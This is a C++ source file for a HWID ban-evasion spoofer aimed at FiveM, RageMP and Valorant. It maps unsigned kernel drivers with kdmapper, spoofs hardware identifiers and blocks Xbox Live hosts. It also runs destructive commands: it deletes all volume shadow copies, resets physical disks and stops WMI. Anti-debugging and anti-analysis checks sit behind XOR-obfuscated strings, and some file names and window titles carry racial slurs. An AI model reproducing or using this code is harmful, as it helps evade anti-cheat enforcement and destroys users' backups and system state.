	system(_xor_("C:/Windows/IME/mac.exe").c_str());
	system(_xor_("NETSH WINSOCK RESET").c_str());
	system(_xor_("NETSH INT IP RESET").c_str());
	system(_xor_("NETSH INTERFACE IPV4 RESET").c_str());
	system(_xor_("NETSH INTERFACE IPV6 RESET").c_str());
	system(_xor_("NETSH INTERFACE TCP RESET").c_str());
	system(_xor_("IPCONFIG /RELEASE").c_str());
	system(_xor_("IPCONFIG /RELEASE").c_str());
	system(_xor_("IPCONFIG /RENEW").c_str());
	system(_xor_("IPCONFIG /FLUSHDNS").c_str());
	system(_xor_("IPCONFIG /RENEW").c_str());
	system(_xor_("net stop winmgmt /y >nul 2>&1").c_str());
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("Successfully reset!");
	system("vssadmin delete shadows /All /Quiet >nul 2>&1");
	clear();
	remove("C:/kdmapper.exe");
	remove("C:/nigga.bat");
	remove("C:/appld.sys");
	exit(0);
}

void FiveMSp00fer()
{
	clear();
	bypassdl();
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	int choice1;
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n     [") << dye::aqua("1") << ("] Cleaner FiveM");
	std::cout << _xor_("\n     [") << dye::aqua("2") << ("] Bypass On");
	std::cout << _xor_("\n     [") << dye::aqua("3") << ("] Bypass Off");
	std::cout << _xor_("\n\n");
	std::cout << _xor_("\n     [") << dye::aqua("4") << ("] Permanent Sp00f");
	std::cout << _xor_("\n     [") << dye::aqua("5") << ("] Exit FiveM");
	std::cout << _xor_("\n     [") << dye::aqua("6") << ("] Return");

	std::cout << _xor_("\n\n     [") << dye::aqua(">") << "]  ";

	std::cin >> choice1;

	switch (choice1)
	{
	case 1:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Starting cleaning FiveM...");
		xbox();
		REG2();
		system("start C:/Windows/IME/cleaner.exe");
		system("echo 127.0.0.1 xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts");
		system("echo 127.0.0.1 user.auth.xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts");
		system("echo 127.0.0.1 presence-heartbeat.xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts");
		Sleep(5000);
		system(_xor_("start cmd /c START CMD /C \"COLOR C && TITLE N*GGA && ECHO KAYKL ON TOP. && TIMEOUT 3 >nul").c_str());
		clear();
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("FiveM Traces cleaned!");
		Sleep(1000);
		FiveMSp00fer();
		exit(0);
		break;
	case 2:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Bypass starting...");
		Sleep(300);
		system("C:/Windows/IME/BYPASS.bat >nul");
		Sleep(5000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Bypass activate!");
		remove("C:/Windows/IME/BYPASS.bat");
		FiveMSp00fer();
		exit(0);
		break;
	case 3:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Disable Bypass...");
		Sleep(300);
		system("C:/Windows/IME/delete_bypass.bat >nul");
		Sleep(5000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Bypass disabled!");
		remove("C:/Windows/IME/delete_bypass.bat");
		FiveMSp00fer();
		exit(0);
		remove("C:/Windows/IME/delete_bypass.bat");
		break;
	case 4:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Not available!");
		FiveMSp00fer();
		exit(0);
		break;
	case 5:
		system("C:/Windows/IME/BYPASS.bat >nul");
		Sleep(1000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Bypass starting...");
		Sleep(300);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Forcing FiveM to close...");
		if (FindProcessId(_xor_("FiveM.exe").c_str()) != 0)
		{
			system(_xor_("taskkill /f /im FiveM.exe >nul 2>&1").c_str());
			std::cout << ("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("FiveM closed!");
		}
		Sleep(5000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Bypass activate!");
		remove("C:/Windows/IME/BYPASS.bat");
		FiveMSp00fer();
		exit(0);
		remove("C:/Windows/IME/BYPASS.bat");
		break;
	case 6:
		clear();
		loader1();
		exit(0);
		break;
	default:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("ERROR: if the error persist contact an owner | ERROR:1");
		Sleep(3000);
		exit(0);
	}
}

void checkadmin() {
	bool IsRunningAsAdmin = false;

	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	IsRunningAsAdmin = fRet;

	if (!IsRunningAsAdmin) {
		int msgboxID = MessageBoxA(
			NULL,
			"Please restart the application and run as administrator...",
			"Error.",
			MB_OK
		);
		exit(-1);
	}
}

void driverdetect()
{
	const TCHAR* devices[] = {
(_xor_(_T("\\\\.\\NiGgEr")).c_str()),
(_xor_(_T("\\\\.\\KsDumper")).c_str()),
(_xor_(_T("\\\\.\\IDA")).c_str())
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			system(_xor_("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
			system(_xor_("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO IDA Detected. You would crack my program? banane! :) && TIMEOUT 10 >nul").c_str());
			exit(0);
		}
		else
		{

		}
	}
}


void misc()
{
	killdbg();
	exedetect();
	titledetect();
	driverdetect();
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	int choice1;
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n     [") << dye::aqua("1") << ("] Dump3r FiveM (Work for all version FiveM)");
	std::cout << _xor_("\n     [") << dye::aqua("2") << ("] Check Serials");
	std::cout << _xor_("\n");

	std::cout << _xor_("\n\n     [") << dye::aqua(">") << "]  ";

	std::cin >> choice1;

	switch (choice1)
	{
	case 1:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Welcome to the Dump3r FiveM!");
		Sleep(3000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Fatal ERROR! If the problem persist contact kaykL");
		clear();
		misc();
		exit(0);
		break;
	case 2:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("ERROR");
		exit(0);
		break;
	default:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("ERROR: if the error persist contact an owner | ERROR:1");
		Sleep(3000);
		exit(0);
	}
}

void loader1()
{
	killdbg();
	exedetect();
	titledetect();
	driverdetect();
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	int choice1;
	system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n     [") << dye::aqua("1") << ("] HWID Sp00fer");
	std::cout << _xor_("\n     [") << dye::aqua("2") << ("] FiveM Sp00fer");
	std::cout << _xor_("\n     [") << dye::aqua("3") << ("] RageMP Sp00fer");
	std::cout << _xor_("\n     [") << dye::aqua("4") << ("] Valorants Sp00fer"); 
	std::cout << _xor_("\n     [") << dye::aqua("5") << ("] Misc");

	std::cout << _xor_("\n\n     [") << dye::aqua(">") << "]  ";

	std::cin >> choice1;

	switch (choice1)
	{
	case 1:
		salopedepute();
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading...");
		Sleep(2000);
		SetConsoleTitleA(random_string(30).c_str());
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 30%");
		Sleep(3000);
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Installing Drivers..");
		Sleep(5000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver Loaded!");
		system("start C:/Windows/IME/kdmapper.exe C:/Windows/IME/uLLYvMz4ZUeq.sys");
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Driver GPU Loading...");
		Sleep(1000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Fatal ERROR: Contact kaykL if the problem persist!");
		system("start C:/Windows/IME/Usermode_Driver.exe");
		Sleep(500);
		system("start C:/Windows/IME/Volume.exe");
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 75%");
		Sleep(300);
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading SMBIOS driver...");
		Sleep(2000);
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 70%");
		Sleep(2000);
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Installing Drivers..");
		system("start C:/Windows/IME/SMBIOS.exe C:/Windows/IME/SMBIOS.sys");
		Sleep(4000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Fatal ERROR: GPU Driver disabled! Please contact kaykL for more informations");
		//gpusystem();
		Sleep(4000);
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Sp00fed!");
		Sleep(1000);
		rename();
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Reset Panel IP...");
		system("C:/Windows/IME/mac.exe");
		system("NETSH WINSOCK RESET");
		system("NETSH INT IP RESET");
		system("NETSH INTERFACE IPV4 RESET");
		system("NETSH INTERFACE IPV6 RESET");
		system("NETSH INTERFACE TCP RESET");
		system("IPCONFIG /RELEASE");
		system("IPCONFIG /RELEASE");
		system("IPCONFIG /RENEW");
		system("IPCONFIG /FLUSHDNS");
		system("IPCONFIG /RENEW");
		system("net stop winmgmt /y >nul 2>&1");
		Sleep(1000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("Successfully reset!");
		system("vssadmin delete shadows /All /Quiet >nul 2>&1");
		clear();
		remove("C:/Windows/IME/SMBIOS.exe");
		remove("C:/Windows/IME/SMBIOS.sys");
		remove("C:/Windows/IME/kdmapper.exe");
		remove("C:/Windows/IME/uLLYvMz4ZUeq.sys");
		remove("C:/Windows/IME/Usermode_Driver.exe");
		remove("C:/Windows/IME/Volume.exe");
		loader1();
		exit(0);
		break;
	case 2:
		FiveMSp00fer();
		break;
	case 3:
		clear();
		init();
		SetConsoleTitleA(random_string(30).c_str());
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("RageMP driver loading...");
		Sleep(2000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Preparing driver...");
		Sleep(3000);
		driverRageMP();
		Sleep(3000);
		loader1();
		exit(0);
		break;
	case 4:
		clear();
		rename();
		init();
		SetConsoleTitleA(random_string(30).c_str());
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Valorant driver loading...");
		Sleep(3000);
		driverValo();
		clear();
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully loaded all!");
		Sleep(3000);
		salopedepute();
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading...");
		Sleep(2000);
		SetConsoleTitleA(random_string(30).c_str());
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 30%");
		Sleep(3000);
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Installing Drivers..");
		Sleep(5000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver Loaded!");
		system("start C:/nigga.bat >nul");
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Driver GPU Loading...");
		Sleep(4000);
		std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Sp00fed!");
		Sleep(1000);
		rename();
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Reset Panel IP...");
		system("C:/Windows/IME/mac.exe");
		system("NETSH WINSOCK RESET");
		system("NETSH INT IP RESET");
		system("NETSH INTERFACE IPV4 RESET");
		system("NETSH INTERFACE IPV6 RESET");
		system("NETSH INTERFACE TCP RESET");
		system("IPCONFIG /RELEASE");
		system("IPCONFIG /RELEASE");
		system("IPCONFIG /RENEW");
		system("IPCONFIG /FLUSHDNS");
		system("IPCONFIG /RENEW");
		system("net stop winmgmt /y >nul 2>&1");
		Sleep(1000);
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("Successfully reset!");
		system("vssadmin delete shadows /All /Quiet >nul 2>&1");
		clear();
		remove("C:/kdmapper.exe");
		remove("C:/nigga.bat");
		remove("C:/appld.sys");
		exit(0);
		loader1();
		break;
	case 5:
		misc();
		break;
	default:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("ERROR: if the error persist contact an owner | ERROR:1");
		Sleep(3000);
		exit(0);
	}
}

using json = nlohmann::json;
//void nlohmann::basic_json::update(const_reference j);

void loginAuto()
{

	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	ifstream file("settings.json");
	std::string key;

	json username = username;
	json password = password;
	nowLocal = *localtime(&now);
	int msgboxID = MessageBox(
		NULL,
		"Do you want to automatically login? (Yes/No)",
		"",
		MB_ICONQUESTION | MB_YESNO
	);

	switch (msgboxID)
	{
	case IDNO:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Data not be saved automatically!");
		// flemme de faire pr l'instant
		break;
	case IDYES:
		std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Information saved automatically!");
		// flemme de faire pr l'instant
		break;
	}
}

void test()
{
	killdbg();
	exedetect();
	titledetect();
	driverdetect();
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	SetConsoleTitleA("IMAGINE U'") + random_string(30).c_str();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon+1 << "/" << nowLocal.tm_year+1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully connected!");
	Sleep(2000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Checking if you are blacklist/banned from the sp00fer");
	Sleep(3000);
	//loginAuto();
	Sleep(2000);
	clear();
	KeyAuthApp.init();
	clear();
	if (!KeyAuthApp.data.success)
	{
		std::cout << _xor_("\n\ [") << dye::aqua("+") << ("]  Status: ") + dye::red(KeyAuthApp.data.message);
		Sleep(1500);
		exit(0);
	}
	std::cout << dye::aqua("\n     [") << dye::aqua("1") << dye::aqua("] Login");
	std::cout << dye::aqua("\n     [") << dye::aqua("2") << dye::aqua("] Register");
	std::cout << dye::aqua("\n\n     [") << dye::aqua("+") << dye::aqua("] ONLINE USER(S): " + KeyAuthApp.data.numOnlineUsers);
	std::cout << dye::aqua("\n\n     [") << dye::aqua("+") << dye::aqua("] ACCOUNT CREATED: " + KeyAuthApp.data.numUsers);

	std::cout << _xor_("\n\n     [") << dye::aqua(">") << "]  ";

	int option;
	std::string username;
	std::string password;
	std::string key;

	std::cin >> option;

	switch (option)
	{
	case 1:
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Enter username: ");
		std::cin >> username;
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Enter password: ");
		std::cin >> password;
		KeyAuthApp.login(username, password);
		break;
	case 2:
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Enter username: ");
		std::cin >> username;
		std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Enter password: ");
		std::cin >> password;
		std::cout << ("\n\n     [") << dye::aqua(">") << ("] Enter licence: ");
		std::cin >> key;
		KeyAuthApp.regstr(username, password, key);
		break;
	default:
		std::cout << dye::red("\n\n Status: Failure: Invalid Selection");
		std::cout << _xor_("\n\n     [") << dye::red("-") << ("] Status: Failure: Invalid Selection");
		Sleep(3000);
		exit(0);
	}

	if (!KeyAuthApp.data.success)
	{
		//std::cout << "\n Status: " + KeyAuthApp.data.message;
		std::cout << _xor_("\n\n [") << dye::aqua("+") << ("]  Status: ") + dye::red(KeyAuthApp.data.message);
		Sleep(1500);
		exit(0);
	}
	Sleep(2000);
	clear();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully connected to the sp00fer as: ") + KeyAuthApp.data.username;
	rename();
	loginAuto();
	Sleep(3000);
	clear();
	loader1();
	exit(0);
}

int main()
{
	killdbg();
	exedetect();
	titledetect();
	driverdetect();
	checkadmin();
	rename();
	debug();
	std::thread(debug);
	init();
	CConsole::SetRandomTitle();
	std::cout << _xor_("\n\n     [") << dye::aqua("<") << ("] Welcome to Kaykl Spoofer V") + version;
	Sleep(3000);
	std::cout << _xor_("\n\n     [") << dye::red("-") << ("] Waiting, we download the latest version ") + version;
	std::cout << _xor_("\n\n     [") << dye::aqua("-") << ("] The best sp00fer of FiveM");
	Sleep(5000);
	clear();
	test();
	exit(0);
}





// LIBRARY //
std::string tm_to_readable_time(tm ctx) {
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}